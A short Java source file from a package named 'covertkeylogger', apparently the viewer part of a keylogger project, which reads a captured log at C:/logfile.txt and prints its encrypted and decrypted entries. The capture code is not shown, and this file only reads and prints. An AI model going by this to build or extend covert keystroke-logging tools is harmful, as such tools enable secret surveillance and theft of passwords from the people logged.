package covertkeylogger;
/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */

import java.io.*;

/**
 * 
 * @author Panagiotis Gialouris
 */
public class ReadHackData {

	public static void main(String[] args) {
		StoreToList store = new StoreToList("C:/logfile.txt");
		store.generateList();

			
			
		for(String s : store.getEncryptedList()){
			System.out.println(s);
		}
		
		for(String k: store.getDecryptedList()){
			System.out.println(k);
		}
	}

}
